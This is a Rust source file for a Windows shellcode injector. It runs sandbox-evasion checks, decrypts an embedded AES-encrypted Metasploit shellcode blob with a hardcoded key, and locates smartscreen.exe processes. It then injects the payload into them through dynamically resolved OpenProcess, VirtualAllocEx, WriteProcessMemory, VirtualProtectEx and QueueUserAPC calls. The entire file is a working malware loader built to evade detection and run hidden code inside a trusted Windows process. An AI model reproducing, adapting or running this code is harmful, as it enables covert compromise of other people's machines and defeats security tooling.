use data::{
    OpenProcess, OpenThread, QueueUserAPC, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory,
};
use data::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE};
use libaes::Cipher;
use random_string::generate;
use std::panic;
use std::ptr::null_mut;
use sysinfo::{PidExt, ProcessExt, System, SystemExt};
use windows::Win32::Foundation::BOOL;
use windows::Win32::UI::Input::Pointer::EnableMouseInPointer;

fn brace() {
    // sandbox detected, eject!
    for _i in 1..10000000 {
        continue;
    }
    panic!("BRACE");
}

fn weird_api() -> BOOL {
    // check if in sandbox by calling an uncommon API
    unsafe {
        let res: BOOL = EnableMouseInPointer(true);
        return res;
    }
}

fn space_call() -> bool {
    // check if in sandbox by trying to reach a non existing resource
    let charset = "abcdefghijklmnopqrstuvwyz";
    let prefix = generate(15, charset);
    let ta_url = "https://".to_owned() + &prefix + ".cloudfront.com/";
    //println!("{}", ta_url);
    let _res = match reqwest::blocking::get(ta_url) {
        Ok(_val) => return false,
        Err(_e) => return true,
    };
}

fn boxboxbox(tar: &str) -> Vec<u32> {
    // search for processes to inject into
    let mut dom: Vec<u32> = Vec::new();
    let s = System::new_all();
    for pro in s.processes_by_exact_name(tar) {
        dom.push(pro.pid().as_u32());
    }
    return dom;
}

fn enhance(buf: &[u8], tar: &u32) {
    // injecting in target processes :)
    println!("[+] Targeting {}", tar);

    let kernel32 = dinvoke::get_module_base_address("kernel32.dll");
    let process = remoteprocess::Process::new(*tar);

    unsafe {
        let hProcess;
        let all_access = 0xFFFF;
        let function_type: OpenProcess;
        dinvoke::dynamic_invoke!(
            kernel32,
            "OpenProcess",
            function_type,
            hProcess,
            all_access,
            0,
            *tar
        );

        if let Some(hProcess) = hProcess {
            let resultPtr;
            let function_type2: VirtualAllocEx;
            dinvoke::dynamic_invoke!(
                kernel32,
                "VirtualAllocEx",
                function_type2,
                resultPtr,
                hProcess,
                null_mut(),
                buf.len(),
                MEM_COMMIT,
                PAGE_READWRITE
            );
            let mut _resultBool;
            let function_type3: WriteProcessMemory;
            let mut byteswritten = 0;
            dinvoke::dynamic_invoke!(
                kernel32,
                "WriteProcessMemory",
                function_type3,
                _resultBool,
                hProcess,
                resultPtr.unwrap(),
                buf.as_ptr() as _,
                buf.len(),
                &mut byteswritten
            );
            for thread in process.unwrap().threads().unwrap().iter() {
                println!("Found thread {}", thread.id().unwrap());
                let function_type4: OpenThread;
                let handle;
                dinvoke::dynamic_invoke!(
                    kernel32,
                    "OpenThread",
                    function_type4,
                    handle,
                    0xFFFF, //THREAD_ALL_ACCESS
                    bindings::Windows::Win32::Foundation::BOOL::from(false),
                    thread.id().unwrap()
                );

                let mut old_perms = PAGE_EXECUTE_READ;
                let function_type5: VirtualProtectEx;
                dinvoke::dynamic_invoke!(
                    kernel32,
                    "VirtualProtectEx",
                    function_type5,
                    _resultBool,
                    hProcess,
                    resultPtr.unwrap(),
                    buf.len(),
                    PAGE_EXECUTE_READ,
                    &mut old_perms
                );
                //thanks Nick12
                let function_type6: QueueUserAPC;
                let _qua;
                dinvoke::dynamic_invoke!(
                    kernel32,
                    "QueueUserAPC",
                    function_type6,
                    _qua,
                    Some(std::mem::transmute(resultPtr.unwrap())),
                    handle.unwrap(),
                    0
                );
            }
        }
    }
}

fn sable() {
    // sandbox check meta function
    if weird_api() == false {
        brace();
    } else if space_call() == false {
        brace();
    } else {
        println!("All clear");
    }
}

fn aes_256_decrypt(shellcode: &Vec<u8>, key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    // thanks to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
    let cipher = Cipher::new_256(key);
    let decrypted = cipher.cbc_decrypt(iv, &shellcode);

    decrypted
}

fn main() {
    // inject in the following processes:
    let tar: &str = "smartscreen.exe";

    // aes encrypted msf shellcode :
    let enc_buf: Vec<u8> = vec![
        0xef, 0x5, 0xb4, 0xf7, 0xf4, 0xe1, 0x69, 0xc5, 0xd8, 0x76, 0xe3, 0xae, 0x4b, 0x62, 0x25,
        0x32, 0xd0, 0xdb, 0xdd, 0x30, 0x41, 0xbb, 0x2d, 0x9, 0x88, 0x7, 0xbb, 0x83, 0x94, 0x70,
        0xd2, 0x87, 0x4, 0x11, 0xf6, 0x3c, 0xef, 0xc6, 0xd0, 0x7c, 0x6e, 0x31, 0x12, 0x3b, 0xc2,
        0x6b, 0x41, 0xf9, 0x1c, 0xc7, 0x15, 0xee, 0x8d, 0x47, 0x6e, 0x6a, 0xe3, 0x4, 0x15, 0xf7,
        0x8c, 0xde, 0x46, 0xb2, 0x45, 0x6e, 0xbc, 0x19, 0x42, 0xc1, 0x9b, 0x6f, 0x85, 0x68, 0x5d,
        0xc4, 0x18, 0xd4, 0xeb, 0x7d, 0x64, 0x45, 0x2e, 0x96, 0x6e, 0x42, 0x18, 0x76, 0xd2, 0x32,
        0x6e, 0x52, 0xc8, 0xa2, 0x12, 0xa3, 0xa5, 0x9, 0xa8, 0x3c, 0x45, 0xef, 0x18, 0x8, 0xb4,
        0x96, 0xbd, 0x86, 0x4, 0xc7, 0xf1, 0xa0, 0x47, 0x48, 0x4f, 0x76, 0xd8, 0x8, 0xa9, 0x5b,
        0xc7, 0x6e, 0xa3, 0x17, 0x24, 0x11, 0x15, 0x1f, 0xcc, 0xf7, 0x20, 0xf4, 0xcf, 0xdc, 0x86,
        0x8a, 0xf4, 0x53, 0xc7, 0x96, 0x42, 0x1f, 0xa7, 0xa5, 0xfa, 0xa0, 0xf1, 0x2c, 0xcd, 0xc5,
        0xa7, 0xad, 0x46, 0xdb, 0x64, 0x82, 0xa3, 0xf0, 0x9, 0x2b, 0xa9, 0xa3, 0xfd, 0xc2, 0x72,
        0x40, 0x47, 0x4, 0xe8, 0xee, 0x39, 0xb9, 0x47, 0xa, 0xf5, 0x87, 0x3d, 0x48, 0xee, 0xb3,
        0xe2, 0x7c, 0xc2, 0xf2, 0xbc, 0xed, 0xd6, 0xb2, 0x13, 0xbc, 0xe0, 0x7d, 0x87, 0x59, 0x46,
        0xf5, 0x58, 0x80, 0x86, 0x8c, 0x4, 0x2, 0xe8, 0x71, 0x7e, 0x9a, 0x20, 0x82, 0x8e, 0x19,
        0xc1, 0x4b, 0x16, 0x9f, 0x9c, 0xb1, 0x78, 0x3b, 0x7e, 0x9, 0x11, 0x7b, 0x30, 0x49, 0x26,
        0xd1, 0x97, 0x63, 0xa5, 0x87, 0xc3, 0x27, 0x4f, 0x1e, 0x61, 0x40, 0x38, 0xd3, 0xfe, 0x49,
        0xcf, 0xb8, 0x8c, 0xa4, 0x7, 0x37, 0x93, 0x41, 0xd7, 0xb, 0x92, 0x28, 0x31, 0x2d, 0x37,
        0xa6, 0xe, 0xef, 0x32, 0x93, 0xb1, 0x6c, 0xb5, 0x9c, 0x3b, 0x34, 0xdf, 0xa8, 0x78, 0xd2,
        0x5a, 0xb8, 0x64, 0x45, 0xe2, 0xd9, 0xba, 0x8e, 0x6b, 0x93, 0x29, 0xba, 0x1a, 0x9d, 0x1c,
        0x57, 0x17, 0x39, 0xa7, 0x2c, 0x80, 0x49, 0x7d, 0xa2, 0xbb, 0x25, 0xd7, 0x6e, 0x37, 0x53,
        0xce, 0xf3, 0x40, 0xa8, 0xc2, 0xb9, 0xf7, 0xb, 0xab, 0x42, 0x18, 0xf9, 0x1a, 0xc5, 0x4c,
        0xae, 0x1e, 0xfb, 0xf8, 0x1f, 0x79, 0x2d, 0x63, 0xb0, 0x3d, 0xf9, 0xac, 0xb5, 0xda, 0x8d,
        0xfb, 0x6d, 0x74, 0xc2, 0x29, 0x9d, 0x10, 0x3f, 0xa7, 0x46, 0x62, 0xbd, 0x4e, 0x1d, 0x91,
        0x23, 0xcd, 0xec, 0xa7, 0x20, 0x27, 0xfa, 0x77, 0x65, 0x83, 0xdd, 0x50, 0x12, 0xbc, 0xe9,
        0xd6, 0x40, 0x46, 0xcb, 0x96, 0x7b, 0x29, 0x97, 0x91, 0x7c, 0x22, 0x53, 0x9e, 0x77, 0xa8,
        0x7f, 0x37, 0xe7, 0x6c, 0xb, 0x69, 0x3e, 0x21, 0x4c, 0xe4, 0x62, 0xc0, 0xb0, 0x91, 0xe,
        0xdb, 0xf2, 0x40, 0x9f, 0x48, 0xf5, 0x10, 0xa, 0xf2, 0x21, 0xe5, 0x2, 0xaa, 0xbd, 0xe9,
        0x34, 0x9, 0x3b, 0xa0, 0x38, 0xf4, 0x9f, 0x5, 0x8b, 0xff, 0xb2, 0xef, 0xf0, 0x5f, 0x91,
        0x4b, 0x1e, 0xaa, 0xe0, 0x41, 0xc1, 0xe5, 0x27, 0x4d, 0xa8, 0x6e, 0xf6, 0xbb, 0xad, 0x25,
        0x8, 0xd9, 0x4d, 0xe4, 0x36, 0xbd, 0x5c, 0xd2, 0xe, 0xb7, 0x96, 0xbc, 0x96, 0x70, 0x16,
        0xde, 0xa1, 0xd4, 0xda, 0xa3, 0x6f, 0xde, 0x23, 0xe4, 0x10, 0x2e, 0xa9, 0x77, 0x1a, 0xbb,
        0xd3, 0x1b, 0xcd, 0xf0, 0xb1, 0x10, 0x68, 0xf5, 0xbd, 0xdf, 0xda, 0x73, 0x93, 0xf, 0xa4,
        0x2b, 0xee, 0x94, 0x89, 0x53, 0x7c, 0xec, 0x71, 0xb2, 0xf3, 0xd, 0xf7, 0xd9, 0x99, 0xcb,
        0x21, 0xa4, 0xc0, 0x18, 0x60, 0x43, 0x11, 0xea, 0x72, 0x6d, 0xf0, 0x84, 0x17, 0xf2, 0xd1,
        0x2d, 0xcf, 0x4c, 0xe5, 0x68, 0xb8, 0x5c, 0x1c, 0x5a, 0x9b, 0xb5, 0xb9, 0x2e, 0xf7, 0x6f,
        0x2e, 0x88, 0x6e, 0x45, 0xd5, 0x6d, 0xb9, 0xb0, 0xa2, 0x16, 0x5f, 0xdd, 0x51, 0x4d, 0x78,
        0x33, 0xd4, 0x89, 0x6f, 0xa9, 0x9c, 0x55, 0xac, 0x37, 0xa0, 0xe0, 0xa7, 0xd6, 0xc5, 0xb0,
        0xa3, 0x6e, 0x38, 0xea, 0x68, 0x26, 0x38, 0xfc, 0x98, 0x7f, 0x19, 0xd, 0x50, 0xe4, 0x37,
        0x2c, 0x38, 0xc2, 0x97, 0xc2, 0x6a, 0xc3, 0x1e, 0xa5, 0x4a, 0x65, 0x57, 0x9b, 0xb7, 0x9b,
        0xa6, 0x9b, 0xa7, 0xda, 0xd4, 0xe1, 0xcc, 0xf5, 0xad, 0x2, 0x75, 0x86, 0xbd, 0xaf, 0x1b,
        0xc, 0xae, 0xb5, 0x1c, 0x2f, 0x27, 0xf2, 0xf4, 0xbd, 0x5c, 0x37, 0xa7, 0xef, 0x35, 0xf5,
        0x4d, 0x31, 0x1, 0xc3, 0xf0, 0x7a, 0xd, 0x1a, 0xc3, 0x77, 0x65, 0xb7, 0x32, 0x66, 0x4f,
        0x3, 0x18, 0x74, 0xc5, 0x72, 0x33, 0x46, 0xa9, 0x4f, 0x8a, 0xd4, 0x47, 0x7a, 0xd6, 0x2d,
        0x8c, 0x8a, 0x32, 0xa8, 0xa, 0x4b, 0xcc, 0x62, 0xe3, 0x7, 0xe8, 0x61, 0x7f, 0x2e, 0x16,
        0x5, 0x7e, 0x7c, 0x83, 0xf8, 0x1d, 0x3b, 0x0, 0x72, 0xa3, 0xac, 0xb1, 0x86, 0x6c, 0x6f,
        0x9, 0x8a, 0xb3, 0x6d, 0x68, 0x18, 0x61, 0x83, 0x72, 0x70, 0xc8, 0xa2, 0x7c, 0x55, 0xa7,
        0x9d, 0x7e, 0xb6, 0x54, 0x39, 0xc4, 0x52, 0xa3, 0xf6, 0x4, 0xcd, 0xf3, 0x6a, 0x8, 0x10,
        0x34, 0xc6, 0x9a, 0xc2, 0x10, 0x88, 0xe, 0xf7, 0x51, 0x93, 0x8a, 0x24, 0xa, 0x49, 0x8c,
        0xd0, 0x7d, 0x88, 0xbc, 0xe, 0xa8, 0x66, 0x2d, 0xbb, 0x1e, 0xab, 0x9, 0x3e, 0xf8, 0xc3,
        0xf3, 0x1f, 0x3a, 0x93, 0x8d, 0xbe, 0x27, 0x8f, 0xdb, 0xb5, 0x30, 0xf, 0x2d, 0xf7, 0x79,
        0x60, 0x36, 0x4f, 0xfd, 0xd4, 0x2, 0x73, 0x15, 0x9c, 0xee, 0x42, 0xa0, 0xc7, 0x3d, 0x3b,
        0xad, 0x4e, 0x17, 0xce, 0x99, 0x51, 0x2f, 0x5b, 0x92, 0x9c, 0xb2, 0x5c, 0x40, 0xcb, 0x4a,
        0xfe, 0x2b, 0xfb, 0x2, 0x9, 0xe6, 0x47, 0xf3, 0xbb, 0x68, 0xca, 0x62, 0xb2, 0x8d, 0xe0,
        0x71, 0xa7, 0xbc, 0x57, 0x25,
    ];

    sable();
    let list: Vec<u32> = boxboxbox(tar);
    if list.len() == 0 {
        panic!("Unable to find a process.")
    } else {
        let buf: Vec<u8> = aes_256_decrypt(
            // thanks again to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
            &enc_buf,
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZ-01337",
            b"This is 16 bytes",
        );
        for i in &list {
            println!("Found process {}", i);
            enhance(&buf, i);
        }
    }
}
